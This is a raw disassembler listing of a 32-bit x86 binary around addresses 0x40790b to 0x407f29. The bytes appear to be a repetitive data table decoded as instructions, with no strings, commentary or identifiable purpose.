  40790b:	00 00                	add    %al,(%eax)
  40790d:	00 07                	add    %al,(%edi)
  40790f:	07                   	pop    %es
  407910:	00 00                	add    %al,(%eax)
  407912:	00 01                	add    %al,(%ecx)
	...
  40791c:	11 01                	adc    %eax,(%ecx)
  40791e:	00 00                	add    %al,(%eax)
  407920:	00 74 74 00          	add    %dh,0x0(%esp,%esi,2)
  407924:	00 00                	add    %al,(%eax)
  407926:	14 00                	adc    $0x0,%al
  407928:	00 00                	add    %al,(%eax)
  40792a:	03 03                	add    (%ebx),%eax
  40792c:	00 00                	add    %al,(%eax)
  40792e:	00 15 01 00 00 00    	add    %dl,0x1
  407934:	74 74                	je     0x4079aa
  407936:	00 00                	add    %al,(%eax)
  407938:	00 16                	add    %dl,(%esi)
  40793a:	17                   	pop    %ss
  40793b:	18 01                	sbb    %al,(%ecx)
  40793d:	00 00                	add    %al,(%eax)
  40793f:	00 ce                	add    %cl,%dh
  407941:	ce                   	into
  407942:	00 00                	add    %al,(%eax)
  407944:	00 12                	add    %dl,(%edx)
  407946:	13 0e                	adc    (%esi),%ecx
  407948:	00 00                	add    %al,(%eax)
  40794a:	00 07                	add    %al,(%edi)
  40794c:	07                   	pop    %es
  40794d:	00 00                	add    %al,(%eax)
  40794f:	00 01                	add    %al,(%ecx)
	...
  407959:	11 01                	adc    %eax,(%ecx)
  40795b:	00 00                	add    %al,(%eax)
  40795d:	00 75 75             	add    %dh,0x75(%ebp)
  407960:	00 00                	add    %al,(%eax)
  407962:	00 01                	add    %al,(%ecx)
  407964:	00 00                	add    %al,(%eax)
  407966:	00 0a                	add    %cl,(%edx)
  407968:	0a 00                	or     (%eax),%al
  40796a:	00 00                	add    %al,(%eax)
  40796c:	01 00                	add    %eax,(%eax)
  40796e:	00 00                	add    %al,(%eax)
  407970:	67 67 00 00          	addr16 add %al,(%bx,%si)
  407974:	00 12                	add    %dl,(%edx)
  407976:	13 0e                	adc    (%esi),%ecx
  407978:	00 00                	add    %al,(%eax)
  40797a:	00 07                	add    %al,(%edi)
  40797c:	07                   	pop    %es
  40797d:	00 00                	add    %al,(%eax)
  40797f:	00 01                	add    %al,(%ecx)
	...
  407989:	11 01                	adc    %eax,(%ecx)
  40798b:	00 00                	add    %al,(%eax)
  40798d:	00 76 76             	add    %dh,0x76(%esi)
  407990:	00 00                	add    %al,(%eax)
  407992:	00 01                	add    %al,(%ecx)
  407994:	00 00                	add    %al,(%eax)
  407996:	00 71 71             	add    %dh,0x71(%ecx)
  407999:	00 00                	add    %al,(%eax)
  40799b:	00 01                	add    %al,(%ecx)
  40799d:	00 00                	add    %al,(%eax)
  40799f:	00 5e 5e             	add    %bl,0x5e(%esi)
  4079a2:	00 00                	add    %al,(%eax)
  4079a4:	00 12                	add    %dl,(%edx)
  4079a6:	13 0e                	adc    (%esi),%ecx
  4079a8:	00 00                	add    %al,(%eax)
  4079aa:	00 07                	add    %al,(%edi)
  4079ac:	07                   	pop    %es
  4079ad:	00 00                	add    %al,(%eax)
  4079af:	00 01                	add    %al,(%ecx)
	...
  4079b9:	11 01                	adc    %eax,(%ecx)
  4079bb:	00 00                	add    %al,(%eax)
  4079bd:	00 77 77             	add    %dh,0x77(%edi)
  4079c0:	00 00                	add    %al,(%eax)
  4079c2:	00 14 00             	add    %dl,(%eax,%eax,1)
  4079c5:	00 00                	add    %al,(%eax)
  4079c7:	03 03                	add    (%ebx),%eax
  4079c9:	00 00                	add    %al,(%eax)
  4079cb:	00 15 01 00 00 00    	add    %dl,0x1
  4079d1:	77 77                	ja     0x407a4a
  4079d3:	00 00                	add    %al,(%eax)
  4079d5:	00 16                	add    %dl,(%esi)
  4079d7:	17                   	pop    %ss
  4079d8:	18 01                	sbb    %al,(%ecx)
  4079da:	00 00                	add    %al,(%eax)
  4079dc:	00 dd                	add    %bl,%ch
  4079de:	dd 00                	fldl   (%eax)
  4079e0:	00 00                	add    %al,(%eax)
  4079e2:	12 13                	adc    (%ebx),%dl
  4079e4:	0e                   	push   %cs
  4079e5:	00 00                	add    %al,(%eax)
  4079e7:	00 07                	add    %al,(%edi)
  4079e9:	07                   	pop    %es
  4079ea:	00 00                	add    %al,(%eax)
  4079ec:	00 01                	add    %al,(%ecx)
	...
  4079f6:	11 01                	adc    %eax,(%ecx)
  4079f8:	00 00                	add    %al,(%eax)
  4079fa:	00 78 78             	add    %bh,0x78(%eax)
  4079fd:	00 00                	add    %al,(%eax)
  4079ff:	00 14 00             	add    %dl,(%eax,%eax,1)
  407a02:	00 00                	add    %al,(%eax)
  407a04:	03 03                	add    (%ebx),%eax
  407a06:	00 00                	add    %al,(%eax)
  407a08:	00 15 01 00 00 00    	add    %dl,0x1
  407a0e:	78 78                	js     0x407a88
  407a10:	00 00                	add    %al,(%eax)
  407a12:	00 16                	add    %dl,(%esi)
  407a14:	17                   	pop    %ss
  407a15:	18 01                	sbb    %al,(%ecx)
  407a17:	00 00                	add    %al,(%eax)
  407a19:	00 d4                	add    %dl,%ah
  407a1b:	d4 00                	aam    $0x0
  407a1d:	00 00                	add    %al,(%eax)
  407a1f:	12 13                	adc    (%ebx),%dl
  407a21:	0e                   	push   %cs
  407a22:	00 00                	add    %al,(%eax)
  407a24:	00 07                	add    %al,(%edi)
  407a26:	07                   	pop    %es
  407a27:	00 00                	add    %al,(%eax)
  407a29:	00 01                	add    %al,(%ecx)
	...
  407a33:	11 01                	adc    %eax,(%ecx)
  407a35:	00 00                	add    %al,(%eax)
  407a37:	00 79 79             	add    %bh,0x79(%ecx)
  407a3a:	00 00                	add    %al,(%eax)
  407a3c:	00 01                	add    %al,(%ecx)
  407a3e:	00 00                	add    %al,(%eax)
  407a40:	00 68 68             	add    %ch,0x68(%eax)
  407a43:	00 00                	add    %al,(%eax)
  407a45:	00 01                	add    %al,(%ecx)
  407a47:	00 00                	add    %al,(%eax)
  407a49:	00 0c 0c             	add    %cl,(%esp,%ecx,1)
  407a4c:	00 00                	add    %al,(%eax)
  407a4e:	00 12                	add    %dl,(%edx)
  407a50:	13 0e                	adc    (%esi),%ecx
  407a52:	00 00                	add    %al,(%eax)
  407a54:	00 07                	add    %al,(%edi)
  407a56:	07                   	pop    %es
  407a57:	00 00                	add    %al,(%eax)
  407a59:	00 01                	add    %al,(%ecx)
	...
  407a63:	11 01                	adc    %eax,(%ecx)
  407a65:	00 00                	add    %al,(%eax)
  407a67:	00 7a 7a             	add    %bh,0x7a(%edx)
  407a6a:	00 00                	add    %al,(%eax)
  407a6c:	00 01                	add    %al,(%ecx)
  407a6e:	00 00                	add    %al,(%eax)
  407a70:	00 ee                	add    %ch,%dh
  407a72:	ee                   	out    %al,(%dx)
  407a73:	00 00                	add    %al,(%eax)
  407a75:	00 01                	add    %al,(%ecx)
  407a77:	00 00                	add    %al,(%eax)
  407a79:	00 8b 8b 00 00 00    	add    %cl,0x8b(%ebx)
  407a7f:	12 13                	adc    (%ebx),%dl
  407a81:	0e                   	push   %cs
  407a82:	00 00                	add    %al,(%eax)
  407a84:	00 07                	add    %al,(%edi)
  407a86:	07                   	pop    %es
  407a87:	00 00                	add    %al,(%eax)
  407a89:	00 01                	add    %al,(%ecx)
	...
  407a93:	11 01                	adc    %eax,(%ecx)
  407a95:	00 00                	add    %al,(%eax)
  407a97:	00 7b 7b             	add    %bh,0x7b(%ebx)
  407a9a:	00 00                	add    %al,(%eax)
  407a9c:	00 01                	add    %al,(%ecx)
  407a9e:	00 00                	add    %al,(%eax)
  407aa0:	00 c2                	add    %al,%dl
  407aa2:	c2 00 00             	ret    $0x0
  407aa5:	00 01                	add    %al,(%ecx)
  407aa7:	00 00                	add    %al,(%eax)
  407aa9:	00 b0 b0 00 00 00    	add    %dh,0xb0(%eax)
  407aaf:	12 13                	adc    (%ebx),%dl
  407ab1:	0e                   	push   %cs
  407ab2:	00 00                	add    %al,(%eax)
  407ab4:	00 07                	add    %al,(%edi)
  407ab6:	07                   	pop    %es
  407ab7:	00 00                	add    %al,(%eax)
  407ab9:	00 01                	add    %al,(%ecx)
	...
  407ac3:	11 01                	adc    %eax,(%ecx)
  407ac5:	00 00                	add    %al,(%eax)
  407ac7:	00 7c 7c 00          	add    %bh,0x0(%esp,%edi,2)
  407acb:	00 00                	add    %al,(%eax)
  407acd:	14 00                	adc    $0x0,%al
  407acf:	00 00                	add    %al,(%eax)
  407ad1:	03 03                	add    (%ebx),%eax
  407ad3:	00 00                	add    %al,(%eax)
  407ad5:	00 15 01 00 00 00    	add    %dl,0x1
  407adb:	7c 7c                	jl     0x407b59
  407add:	00 00                	add    %al,(%eax)
  407adf:	00 16                	add    %dl,(%esi)
  407ae1:	17                   	pop    %ss
  407ae2:	18 01                	sbb    %al,(%ecx)
  407ae4:	00 00                	add    %al,(%eax)
  407ae6:	00 6e 6e             	add    %ch,0x6e(%esi)
  407ae9:	00 00                	add    %al,(%eax)
  407aeb:	00 12                	add    %dl,(%edx)
  407aed:	13 0e                	adc    (%esi),%ecx
  407aef:	00 00                	add    %al,(%eax)
  407af1:	00 07                	add    %al,(%edi)
  407af3:	07                   	pop    %es
  407af4:	00 00                	add    %al,(%eax)
  407af6:	00 01                	add    %al,(%ecx)
	...
  407b00:	11 01                	adc    %eax,(%ecx)
  407b02:	00 00                	add    %al,(%eax)
  407b04:	00 7d 7d             	add    %bh,0x7d(%ebp)
  407b07:	00 00                	add    %al,(%eax)
  407b09:	00 14 00             	add    %dl,(%eax,%eax,1)
  407b0c:	00 00                	add    %al,(%eax)
  407b0e:	03 03                	add    (%ebx),%eax
  407b10:	00 00                	add    %al,(%eax)
  407b12:	00 15 01 00 00 00    	add    %dl,0x1
  407b18:	7d 7d                	jge    0x407b97
  407b1a:	00 00                	add    %al,(%eax)
  407b1c:	00 16                	add    %dl,(%esi)
  407b1e:	17                   	pop    %ss
  407b1f:	18 01                	sbb    %al,(%ecx)
  407b21:	00 00                	add    %al,(%eax)
  407b23:	00 8e 8e 00 00 00    	add    %cl,0x8e(%esi)
  407b29:	12 13                	adc    (%ebx),%dl
  407b2b:	0e                   	push   %cs
  407b2c:	00 00                	add    %al,(%eax)
  407b2e:	00 07                	add    %al,(%edi)
  407b30:	07                   	pop    %es
  407b31:	00 00                	add    %al,(%eax)
  407b33:	00 01                	add    %al,(%ecx)
	...
  407b3d:	11 01                	adc    %eax,(%ecx)
  407b3f:	00 00                	add    %al,(%eax)
  407b41:	00 7e 7e             	add    %bh,0x7e(%esi)
  407b44:	00 00                	add    %al,(%eax)
  407b46:	00 14 00             	add    %dl,(%eax,%eax,1)
  407b49:	00 00                	add    %al,(%eax)
  407b4b:	03 03                	add    (%ebx),%eax
  407b4d:	00 00                	add    %al,(%eax)
  407b4f:	00 15 01 00 00 00    	add    %dl,0x1
  407b55:	7e 7e                	jle    0x407bd5
  407b57:	00 00                	add    %al,(%eax)
  407b59:	00 16                	add    %dl,(%esi)
  407b5b:	17                   	pop    %ss
  407b5c:	18 01                	sbb    %al,(%ecx)
  407b5e:	00 00                	add    %al,(%eax)
  407b60:	00 36                	add    %dh,(%esi)
  407b62:	36 00 00             	add    %al,%ss:(%eax)
  407b65:	00 12                	add    %dl,(%edx)
  407b67:	13 0e                	adc    (%esi),%ecx
  407b69:	00 00                	add    %al,(%eax)
  407b6b:	00 07                	add    %al,(%edi)
  407b6d:	07                   	pop    %es
  407b6e:	00 00                	add    %al,(%eax)
  407b70:	00 01                	add    %al,(%ecx)
	...
  407b7a:	11 01                	adc    %eax,(%ecx)
  407b7c:	00 00                	add    %al,(%eax)
  407b7e:	00 7f 7f             	add    %bh,0x7f(%edi)
  407b81:	00 00                	add    %al,(%eax)
  407b83:	00 01                	add    %al,(%ecx)
  407b85:	00 00                	add    %al,(%eax)
  407b87:	00 c2                	add    %al,%dl
  407b89:	c2 00 00             	ret    $0x0
  407b8c:	00 01                	add    %al,(%ecx)
  407b8e:	00 00                	add    %al,(%eax)
  407b90:	00 af af 00 00 00    	add    %ch,0xaf(%edi)
  407b96:	12 13                	adc    (%ebx),%dl
  407b98:	0e                   	push   %cs
  407b99:	00 00                	add    %al,(%eax)
  407b9b:	00 07                	add    %al,(%edi)
  407b9d:	07                   	pop    %es
  407b9e:	00 00                	add    %al,(%eax)
  407ba0:	00 01                	add    %al,(%ecx)
	...
  407baa:	11 01                	adc    %eax,(%ecx)
  407bac:	00 00                	add    %al,(%eax)
  407bae:	00 80 80 00 00 00    	add    %al,0x80(%eax)
  407bb4:	01 00                	add    %eax,(%eax)
  407bb6:	00 00                	add    %al,(%eax)
  407bb8:	4e                   	dec    %esi
  407bb9:	4e                   	dec    %esi
  407bba:	00 00                	add    %al,(%eax)
  407bbc:	00 01                	add    %al,(%ecx)
  407bbe:	00 00                	add    %al,(%eax)
  407bc0:	00 22                	add    %ah,(%edx)
  407bc2:	22 00                	and    (%eax),%al
  407bc4:	00 00                	add    %al,(%eax)
  407bc6:	12 13                	adc    (%ebx),%dl
  407bc8:	19 00                	sbb    %eax,(%eax)
  407bca:	00 00                	add    %al,(%eax)
  407bcc:	04 04                	add    $0x4,%al
  407bce:	00 00                	add    %al,(%eax)
  407bd0:	00 1a                	add    %bl,(%edx)
  407bd2:	00 00                	add    %al,(%eax)
  407bd4:	00 05 05 00 00 00    	add    %al,0x5
  407bda:	05 09 30 27 bb       	add    $0xbb273009,%eax
  407bdf:	9e                   	sahf
  407be0:	cc                   	int3
  407be1:	00 01                	add    %al,(%ecx)
  407be3:	01 00                	add    %eax,(%eax)
  407be5:	cc                   	int3
  407be6:	9e                   	sahf
  407be7:	bb 27 30 09 06       	mov    $0x6093027,%ebx
	...
  407bf4:	07                   	pop    %es
  407bf5:	00 00                	add    %al,(%eax)
  407bf7:	00 03                	add    %al,(%ebx)
  407bf9:	03 00                	add    (%eax),%eax
  407bfb:	00 00                	add    %al,(%eax)
  407bfd:	08 00                	or     %al,(%eax)
  407bff:	00 00                	add    %al,(%eax)
  407c01:	03 03                	add    (%ebx),%eax
  407c03:	00 00                	add    %al,(%eax)
  407c05:	00 00                	add    %al,(%eax)
  407c07:	00 00                	add    %al,(%eax)
  407c09:	01 01                	add    %eax,(%ecx)
  407c0b:	00 00                	add    %al,(%eax)
  407c0d:	00 09                	add    %cl,(%ecx)
  407c0f:	00 00                	add    %al,(%eax)
  407c11:	00 02                	add    %al,(%edx)
  407c13:	02 00                	add    (%eax),%al
  407c15:	00 00                	add    %al,(%eax)
  407c17:	0a 00                	or     (%eax),%al
  407c19:	00 38                	add    %bh,(%eax)
  407c1b:	8a 8a 38 00 00 00    	mov    0x38(%edx),%cl
  407c21:	00 1c fe             	add    %bl,(%esi,%edi,8)
  407c24:	fe                   	(bad)
  407c25:	1c 00                	sbb    $0x0,%al
  407c27:	00 01                	add    %al,(%ecx)
  407c29:	00 00                	add    %al,(%eax)
  407c2b:	00 81 81 00 00 00    	add    %al,0x81(%ecx)
  407c31:	0b 0c 0d 00 00 00 00 	or     0x0(,%ecx,1),%ecx
  407c38:	00 00                	add    %al,(%eax)
  407c3a:	00 00                	add    %al,(%eax)
  407c3c:	0e                   	push   %cs
  407c3d:	00 00                	add    %al,(%eax)
  407c3f:	00 07                	add    %al,(%edi)
  407c41:	07                   	pop    %es
  407c42:	00 00                	add    %al,(%eax)
  407c44:	00 01                	add    %al,(%ecx)
	...
  407c4e:	0f 00 00             	sldt   (%eax)
  407c51:	00 00                	add    %al,(%eax)
  407c53:	00 00                	add    %al,(%eax)
  407c55:	00 00                	add    %al,(%eax)
  407c57:	10 0e                	adc    %cl,(%esi)
  407c59:	00 00                	add    %al,(%eax)
  407c5b:	00 07                	add    %al,(%edi)
  407c5d:	07                   	pop    %es
  407c5e:	00 00                	add    %al,(%eax)
  407c60:	00 01                	add    %al,(%ecx)
	...
  407c6a:	11 01                	adc    %eax,(%ecx)
	...
  407c74:	01 00                	add    %eax,(%eax)
  407c76:	00 00                	add    %al,(%eax)
  407c78:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  407c79:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  407c7a:	00 00                	add    %al,(%eax)
  407c7c:	00 01                	add    %al,(%ecx)
  407c7e:	00 00                	add    %al,(%eax)
  407c80:	00 f2                	add    %dh,%dl
  407c82:	f2 00 00             	repnz add %al,(%eax)
  407c85:	00 12                	add    %dl,(%edx)
  407c87:	13 0e                	adc    (%esi),%ecx
  407c89:	00 00                	add    %al,(%eax)
  407c8b:	00 07                	add    %al,(%edi)
  407c8d:	07                   	pop    %es
  407c8e:	00 00                	add    %al,(%eax)
  407c90:	00 01                	add    %al,(%ecx)
	...
  407c9a:	11 01                	adc    %eax,(%ecx)
  407c9c:	00 00                	add    %al,(%eax)
  407c9e:	00 01                	add    %al,(%ecx)
  407ca0:	01 00                	add    %eax,(%eax)
  407ca2:	00 00                	add    %al,(%eax)
  407ca4:	1b 00                	sbb    (%eax),%eax
  407ca6:	00 00                	add    %al,(%eax)
  407ca8:	06                   	push   %es
  407ca9:	06                   	push   %es
  407caa:	00 00                	add    %al,(%eax)
  407cac:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  407caf:	00 00                	add    %al,(%eax)
  407cb1:	00 01                	add    %al,(%ecx)
  407cb3:	01 00                	add    %eax,(%eax)
  407cb5:	00 00                	add    %al,(%eax)
  407cb7:	16                   	push   %ss
  407cb8:	17                   	pop    %ss
  407cb9:	18 01                	sbb    %al,(%ecx)
  407cbb:	00 00                	add    %al,(%eax)
  407cbd:	00 eb                	add    %ch,%bl
  407cbf:	eb 00                	jmp    0x407cc1
  407cc1:	00 00                	add    %al,(%eax)
  407cc3:	12 13                	adc    (%ebx),%dl
  407cc5:	0e                   	push   %cs
  407cc6:	00 00                	add    %al,(%eax)
  407cc8:	00 07                	add    %al,(%edi)
  407cca:	07                   	pop    %es
  407ccb:	00 00                	add    %al,(%eax)
  407ccd:	00 01                	add    %al,(%ecx)
	...
  407cd7:	11 01                	adc    %eax,(%ecx)
  407cd9:	00 00                	add    %al,(%eax)
  407cdb:	00 02                	add    %al,(%edx)
  407cdd:	02 00                	add    (%eax),%al
  407cdf:	00 00                	add    %al,(%eax)
  407ce1:	1b 00                	sbb    (%eax),%eax
  407ce3:	00 00                	add    %al,(%eax)
  407ce5:	06                   	push   %es
  407ce6:	06                   	push   %es
  407ce7:	00 00                	add    %al,(%eax)
  407ce9:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  407cec:	00 00                	add    %al,(%eax)
  407cee:	00 02                	add    %al,(%edx)
  407cf0:	02 00                	add    (%eax),%al
  407cf2:	00 00                	add    %al,(%eax)
  407cf4:	16                   	push   %ss
  407cf5:	17                   	pop    %ss
  407cf6:	18 01                	sbb    %al,(%ecx)
  407cf8:	00 00                	add    %al,(%eax)
  407cfa:	00 fb                	add    %bh,%bl
  407cfc:	fb                   	sti
  407cfd:	00 00                	add    %al,(%eax)
  407cff:	00 12                	add    %dl,(%edx)
  407d01:	13 0e                	adc    (%esi),%ecx
  407d03:	00 00                	add    %al,(%eax)
  407d05:	00 07                	add    %al,(%edi)
  407d07:	07                   	pop    %es
  407d08:	00 00                	add    %al,(%eax)
  407d0a:	00 01                	add    %al,(%ecx)
	...
  407d14:	11 01                	adc    %eax,(%ecx)
  407d16:	00 00                	add    %al,(%eax)
  407d18:	00 03                	add    %al,(%ebx)
  407d1a:	03 00                	add    (%eax),%eax
  407d1c:	00 00                	add    %al,(%eax)
  407d1e:	1b 00                	sbb    (%eax),%eax
  407d20:	00 00                	add    %al,(%eax)
  407d22:	06                   	push   %es
  407d23:	06                   	push   %es
  407d24:	00 00                	add    %al,(%eax)
  407d26:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  407d29:	00 00                	add    %al,(%eax)
  407d2b:	00 03                	add    %al,(%ebx)
  407d2d:	03 00                	add    (%eax),%eax
  407d2f:	00 00                	add    %al,(%eax)
  407d31:	16                   	push   %ss
  407d32:	17                   	pop    %ss
  407d33:	18 01                	sbb    %al,(%ecx)
  407d35:	00 00                	add    %al,(%eax)
  407d37:	00 f4                	add    %dh,%ah
  407d39:	f4                   	hlt
  407d3a:	00 00                	add    %al,(%eax)
  407d3c:	00 12                	add    %dl,(%edx)
  407d3e:	13 0e                	adc    (%esi),%ecx
  407d40:	00 00                	add    %al,(%eax)
  407d42:	00 07                	add    %al,(%edi)
  407d44:	07                   	pop    %es
  407d45:	00 00                	add    %al,(%eax)
  407d47:	00 01                	add    %al,(%ecx)
	...
  407d51:	11 01                	adc    %eax,(%ecx)
  407d53:	00 00                	add    %al,(%eax)
  407d55:	00 04 04             	add    %al,(%esp,%eax,1)
  407d58:	00 00                	add    %al,(%eax)
  407d5a:	00 1b                	add    %bl,(%ebx)
  407d5c:	00 00                	add    %al,(%eax)
  407d5e:	00 06                	add    %al,(%esi)
  407d60:	06                   	push   %es
  407d61:	00 00                	add    %al,(%eax)
  407d63:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  407d66:	00 00                	add    %al,(%eax)
  407d68:	00 04 04             	add    %al,(%esp,%eax,1)
  407d6b:	00 00                	add    %al,(%eax)
  407d6d:	00 16                	add    %dl,(%esi)
  407d6f:	17                   	pop    %ss
  407d70:	18 01                	sbb    %al,(%ecx)
  407d72:	00 00                	add    %al,(%eax)
  407d74:	00 ea                	add    %ch,%dl
  407d76:	ea 00 00 00 12 13 0e 	ljmp   $0xe13,$0x12000000
  407d7d:	00 00                	add    %al,(%eax)
  407d7f:	00 07                	add    %al,(%edi)
  407d81:	07                   	pop    %es
  407d82:	00 00                	add    %al,(%eax)
  407d84:	00 01                	add    %al,(%ecx)
	...
  407d8e:	11 01                	adc    %eax,(%ecx)
  407d90:	00 00                	add    %al,(%eax)
  407d92:	00 05 05 00 00 00    	add    %al,0x5
  407d98:	01 00                	add    %eax,(%eax)
  407d9a:	00 00                	add    %al,(%eax)
  407d9c:	f1                   	int1
  407d9d:	f1                   	int1
  407d9e:	00 00                	add    %al,(%eax)
  407da0:	00 01                	add    %al,(%ecx)
  407da2:	00 00                	add    %al,(%eax)
  407da4:	00 90 90 00 00 00    	add    %dl,0x90(%eax)
  407daa:	12 13                	adc    (%ebx),%dl
  407dac:	0e                   	push   %cs
  407dad:	00 00                	add    %al,(%eax)
  407daf:	00 07                	add    %al,(%edi)
  407db1:	07                   	pop    %es
  407db2:	00 00                	add    %al,(%eax)
  407db4:	00 01                	add    %al,(%ecx)
	...
  407dbe:	11 01                	adc    %eax,(%ecx)
  407dc0:	00 00                	add    %al,(%eax)
  407dc2:	00 06                	add    %al,(%esi)
  407dc4:	06                   	push   %es
  407dc5:	00 00                	add    %al,(%eax)
  407dc7:	00 1b                	add    %bl,(%ebx)
  407dc9:	00 00                	add    %al,(%eax)
  407dcb:	00 06                	add    %al,(%esi)
  407dcd:	06                   	push   %es
  407dce:	00 00                	add    %al,(%eax)
  407dd0:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  407dd3:	00 00                	add    %al,(%eax)
  407dd5:	00 06                	add    %al,(%esi)
  407dd7:	06                   	push   %es
  407dd8:	00 00                	add    %al,(%eax)
  407dda:	00 16                	add    %dl,(%esi)
  407ddc:	17                   	pop    %ss
  407ddd:	18 01                	sbb    %al,(%ecx)
  407ddf:	00 00                	add    %al,(%eax)
  407de1:	00 cf                	add    %cl,%bh
  407de3:	cf                   	iret
  407de4:	00 00                	add    %al,(%eax)
  407de6:	00 12                	add    %dl,(%edx)
  407de8:	13 0e                	adc    (%esi),%ecx
  407dea:	00 00                	add    %al,(%eax)
  407dec:	00 07                	add    %al,(%edi)
  407dee:	07                   	pop    %es
  407def:	00 00                	add    %al,(%eax)
  407df1:	00 01                	add    %al,(%ecx)
	...
  407dfb:	11 01                	adc    %eax,(%ecx)
  407dfd:	00 00                	add    %al,(%eax)
  407dff:	00 07                	add    %al,(%edi)
  407e01:	07                   	pop    %es
  407e02:	00 00                	add    %al,(%eax)
  407e04:	00 01                	add    %al,(%ecx)
  407e06:	00 00                	add    %al,(%eax)
  407e08:	00 3b                	add    %bh,(%ebx)
  407e0a:	3b 00                	cmp    (%eax),%eax
  407e0c:	00 00                	add    %al,(%eax)
  407e0e:	01 00                	add    %eax,(%eax)
  407e10:	00 00                	add    %al,(%eax)
  407e12:	48                   	dec    %eax
  407e13:	48                   	dec    %eax
  407e14:	00 00                	add    %al,(%eax)
  407e16:	00 12                	add    %dl,(%edx)
  407e18:	13 0e                	adc    (%esi),%ecx
  407e1a:	00 00                	add    %al,(%eax)
  407e1c:	00 07                	add    %al,(%edi)
  407e1e:	07                   	pop    %es
  407e1f:	00 00                	add    %al,(%eax)
  407e21:	00 01                	add    %al,(%ecx)
	...
  407e2b:	11 01                	adc    %eax,(%ecx)
  407e2d:	00 00                	add    %al,(%eax)
  407e2f:	00 08                	add    %cl,(%eax)
  407e31:	08 00                	or     %al,(%eax)
  407e33:	00 00                	add    %al,(%eax)
  407e35:	1b 00                	sbb    (%eax),%eax
  407e37:	00 00                	add    %al,(%eax)
  407e39:	06                   	push   %es
  407e3a:	06                   	push   %es
  407e3b:	00 00                	add    %al,(%eax)
  407e3d:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  407e40:	00 00                	add    %al,(%eax)
  407e42:	00 08                	add    %cl,(%eax)
  407e44:	08 00                	or     %al,(%eax)
  407e46:	00 00                	add    %al,(%eax)
  407e48:	16                   	push   %ss
  407e49:	17                   	pop    %ss
  407e4a:	18 01                	sbb    %al,(%ecx)
  407e4c:	00 00                	add    %al,(%eax)
  407e4e:	00 2e                	add    %ch,(%esi)
  407e50:	2e 00 00             	add    %al,%cs:(%eax)
  407e53:	00 12                	add    %dl,(%edx)
  407e55:	13 0e                	adc    (%esi),%ecx
  407e57:	00 00                	add    %al,(%eax)
  407e59:	00 07                	add    %al,(%edi)
  407e5b:	07                   	pop    %es
  407e5c:	00 00                	add    %al,(%eax)
  407e5e:	00 01                	add    %al,(%ecx)
	...
  407e68:	11 01                	adc    %eax,(%ecx)
  407e6a:	00 00                	add    %al,(%eax)
  407e6c:	00 09                	add    %cl,(%ecx)
  407e6e:	09 00                	or     %eax,(%eax)
  407e70:	00 00                	add    %al,(%eax)
  407e72:	1b 00                	sbb    (%eax),%eax
  407e74:	00 00                	add    %al,(%eax)
  407e76:	06                   	push   %es
  407e77:	06                   	push   %es
  407e78:	00 00                	add    %al,(%eax)
  407e7a:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  407e7d:	00 00                	add    %al,(%eax)
  407e7f:	00 09                	add    %cl,(%ecx)
  407e81:	09 00                	or     %eax,(%eax)
  407e83:	00 00                	add    %al,(%eax)
  407e85:	16                   	push   %ss
  407e86:	17                   	pop    %ss
  407e87:	18 01                	sbb    %al,(%ecx)
  407e89:	00 00                	add    %al,(%eax)
  407e8b:	00 da                	add    %bl,%dl
  407e8d:	da 00                	fiaddl (%eax)
  407e8f:	00 00                	add    %al,(%eax)
  407e91:	12 13                	adc    (%ebx),%dl
  407e93:	0e                   	push   %cs
  407e94:	00 00                	add    %al,(%eax)
  407e96:	00 07                	add    %al,(%edi)
  407e98:	07                   	pop    %es
  407e99:	00 00                	add    %al,(%eax)
  407e9b:	00 01                	add    %al,(%ecx)
	...
  407ea5:	11 01                	adc    %eax,(%ecx)
  407ea7:	00 00                	add    %al,(%eax)
  407ea9:	00 0a                	add    %cl,(%edx)
  407eab:	0a 00                	or     (%eax),%al
  407ead:	00 00                	add    %al,(%eax)
  407eaf:	01 00                	add    %eax,(%eax)
  407eb1:	00 00                	add    %al,(%eax)
  407eb3:	f5                   	cmc
  407eb4:	f5                   	cmc
  407eb5:	00 00                	add    %al,(%eax)
  407eb7:	00 01                	add    %al,(%ecx)
  407eb9:	00 00                	add    %al,(%eax)
  407ebb:	00 97 97 00 00 00    	add    %dl,0x97(%edi)
  407ec1:	12 13                	adc    (%ebx),%dl
  407ec3:	0e                   	push   %cs
  407ec4:	00 00                	add    %al,(%eax)
  407ec6:	00 07                	add    %al,(%edi)
  407ec8:	07                   	pop    %es
  407ec9:	00 00                	add    %al,(%eax)
  407ecb:	00 01                	add    %al,(%ecx)
	...
  407ed5:	11 01                	adc    %eax,(%ecx)
  407ed7:	00 00                	add    %al,(%eax)
  407ed9:	00 0b                	add    %cl,(%ebx)
  407edb:	0b 00                	or     (%eax),%eax
  407edd:	00 00                	add    %al,(%eax)
  407edf:	01 00                	add    %eax,(%eax)
  407ee1:	00 00                	add    %al,(%eax)
  407ee3:	f8                   	clc
  407ee4:	f8                   	clc
  407ee5:	00 00                	add    %al,(%eax)
  407ee7:	00 01                	add    %al,(%ecx)
  407ee9:	00 00                	add    %al,(%eax)
  407eeb:	00 94 94 00 00 00 12 	add    %dl,0x12000000(%esp,%edx,4)
  407ef2:	13 0e                	adc    (%esi),%ecx
  407ef4:	00 00                	add    %al,(%eax)
  407ef6:	00 07                	add    %al,(%edi)
  407ef8:	07                   	pop    %es
  407ef9:	00 00                	add    %al,(%eax)
  407efb:	00 01                	add    %al,(%ecx)
	...
  407f05:	11 01                	adc    %eax,(%ecx)
  407f07:	00 00                	add    %al,(%eax)
  407f09:	00 0c 0c             	add    %cl,(%esp,%ecx,1)
  407f0c:	00 00                	add    %al,(%eax)
  407f0e:	00 01                	add    %al,(%ecx)
  407f10:	00 00                	add    %al,(%eax)
  407f12:	00 c2                	add    %al,%dl
  407f14:	c2 00 00             	ret    $0x0
  407f17:	00 01                	add    %al,(%ecx)
  407f19:	00 00                	add    %al,(%eax)
  407f1b:	00 bb bb 00 00 00    	add    %bh,0xbb(%ebx)
  407f21:	12 13                	adc    (%ebx),%dl
  407f23:	0e                   	push   %cs
  407f24:	00 00                	add    %al,(%eax)
  407f26:	00 07                	add    %al,(%edi)
  407f28:	07                   	pop    %es
  407f29:	00 00                	add    %al,(%eax)
